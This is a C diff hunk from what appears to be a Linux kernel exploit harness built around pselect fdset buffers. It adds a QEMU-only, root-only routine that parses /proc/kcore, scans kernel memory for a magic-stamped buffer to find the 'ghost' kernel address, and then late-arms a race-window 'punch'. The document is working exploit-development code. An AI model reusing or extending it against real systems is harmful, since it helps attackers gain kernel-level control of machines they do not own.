@@ -378,6 +378,63 @@ void *consumer_thread(void *arg __attribute__((unused))) {
        * PSELECT_GHOST_DELTA (QEMU-calibrated) gives the ghost address;
        * the /proc-syscall SP path was USER-sp (dead end, kept for
        * reference). Published here pre-arm so the final stamps carry it. */
+      /* KCORE SCAN (QEMU, root): find the MAGIC-stamped fdset buffer in
+       * kernel memory -> the REAL ghost, same boot. Then late-arm the
+       * punch (scan takes seconds; the spin window stays open). */
+      if (!g_ghost_kva && env_flag("QEMU_KCORE_SCAN", 0)) {
+        int kf = open("/proc/kcore", O_RDONLY);
+        int hit = 0;
+        if (kf >= 0) {
+          unsigned char eh[64];
+          if (pread(kf, eh, 64, 0) == 64 && eh[0] == 0x7f) {
+            unsigned long phoff, phent, phnum;
+            memcpy(&phoff, eh + 32, 8);
+            memcpy(&phent, eh + 54, 2);
+            memcpy(&phnum, eh + 56, 2);
+            for (unsigned p = 0; p < phnum && !hit; p++) {
+              unsigned char ph[56];
+              if (pread(kf, ph, 56, phoff + p * phent) != 56)
+                break;
+              unsigned int ptype;
+              unsigned long poff, pva, pfsz;
+              memcpy(&ptype, ph, 4);
+              memcpy(&poff, ph + 8, 8);
+              memcpy(&pva, ph + 16, 8);
+              memcpy(&pfsz, ph + 32, 8);
+              if (ptype != 1 || pfsz == 0 || pfsz > (1UL << 30))
+                continue;
+              if (pva < 0xffffff8000000000UL)
+                continue; /* kernel-space segments only */
+              static unsigned char kb[1 << 20];
+              for (unsigned long o = 0; o + 8 <= pfsz && !hit;
+                   o += sizeof(kb)) {
+                size_t chz = sizeof(kb);
+                if (o + chz > pfsz)
+                  chz = (size_t)(pfsz - o);
+                ssize_t rn = pread(kf, kb, chz, (off_t)(poff + o));
+                if (rn < 8)
+                  break;
+                for (ssize_t i = 0; i + 8 <= rn; i += 8) {
+                  uint64_t v;
+                  memcpy(&v, kb + i, 8);
+                  if (v == (uint64_t)PSELECT_MAGIC_WORD) {
+                    g_ghost_kva = (uintptr_t)(pva + o + i - 14 * 8);
+                    hit = 1;
+                    break;
+                  }
+                }
+              }
+            }
+          }
+          close(kf);
+        }
+        pr_info("KCORE ghost=%lx (scan %s)\n",
+                (unsigned long)g_ghost_kva, hit ? "HIT" : "MISS");
+        if (hit) {
+          atomic_store(&punch_consume_go, 1); /* late-arm after scan */
+          seen = 1;
+        }
+      }
       if (!g_ghost_kva) {
         const char *fk = getenv("PSELECT_GHOST_FORCE_KVA");
         if (fk && fk[0]) {
